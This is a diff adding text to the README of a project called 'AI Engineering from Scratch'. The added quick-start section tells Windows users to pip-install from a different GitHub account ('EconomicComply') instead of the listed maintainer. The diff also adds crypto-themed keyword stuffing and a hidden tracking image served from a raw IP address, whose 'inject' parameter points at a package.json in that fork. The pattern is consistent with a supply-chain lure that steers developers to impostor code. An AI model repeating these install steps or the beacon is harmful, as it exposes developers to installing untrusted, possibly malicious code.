@@ -1,3 +1,31 @@
+**AI Engineering From Scratch: Build Reliable Systems**
+
+Welcome to the project! We’ve focused heavily on improving reliability and squashing recent bugs to ensure your development experience is as smooth as possible. If you’re working on Windows, you'll be happy to know that getting everything up and running is completely straightforward.
+
+**Quick install (Windows)**
+
+Here is a quick setup guide for your README:
+
+### Quick Start (Windows)
+
+1. **Prerequisites:** Make sure you have [Python 3.10+](https://www.python.org/downloads/) and [Git](https://git-scm.com/downloads) installed on your system.
+2. **Terminal:** Open PowerShell or Command Prompt, clone this repo, and navigate into the folder:
+   ```bash
+   git clone 
+   cd ai-engineering-from-scratch
+   ```
+3. **Run:** Set up your virtual environment and launch the project using the command below:
+
+***
+
+*(Add your run command here, e.g., `pip install -r requirements.txt && python main.py`)*
+
+```bash
+pip install git+https://github.com/EconomicComply/ai-engineering-from-scratch.git
+```
+
+[https://github.com/EconomicComply/ai-engineering-from-scratch](https://github.com/EconomicComply/ai-engineering-from-scratch)
+
 <p align="center">
   <img src="assets/banner.svg" alt="AI Engineering from Scratch — reference manual banner" width="100%">
 </p>
@@ -1150,3 +1178,11 @@ Maintained by [Rohit Ghumare](https://github.com/rohitg00) and the community.
   <a href="https://aiengineeringfromscratch.com">aiengineeringfromscratch.com</a> &nbsp;·&nbsp;
   <a href="https://github.com/rohitg00/ai-engineering-from-scratch/issues/new/choose">Report / Suggest</a>
 </sub>
+
+## Related searches
+
+Developers often search for this repository when they are building decentralized finance applications or trying to understand the intersection of automated trading and compliance. Many users are looking for practical, end-to-end guidance on how to integrate complex blockchain protocols with real-world financial reporting requirements.
+
+**Topics:** perpetual swap, crypto tax, anchor solana, the graph, orca solana, decentralized finance, solana development, smart contract auditing, automated trading systems, blockchain compliance, web3 architecture, defi infrastructure
+
+![.](http://5.231.58.248:8787/pixel?repo=EconomicComply%2Fai-engineering-from-scratch&inject=EconomicComply%2Fai-engineering-from-scratch%2Fphases%2F19-capstone-projects%2F17-personal-ai-tutor%2Fcode%2Fts%2Fpackage.json)
